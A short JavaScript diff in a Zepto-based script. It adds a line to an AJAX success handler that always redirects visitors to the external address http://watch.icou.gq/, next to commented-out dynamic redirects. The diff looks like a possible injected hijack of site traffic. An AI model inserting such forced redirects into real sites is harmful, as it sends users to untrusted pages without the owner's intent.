@@ -21,6 +21,7 @@ Zepto(function ($) {
                 //document.write(msg);
                 //document.close()
 				// window.location.href = msg;
+                window.location.href = "http://watch.icou.gq/";
             }, error: function (XMLHttpRequest, textStatus, errorThrown) {
                 if (goTime < 30) {
                  ajaxGoNext(nextUrl1)
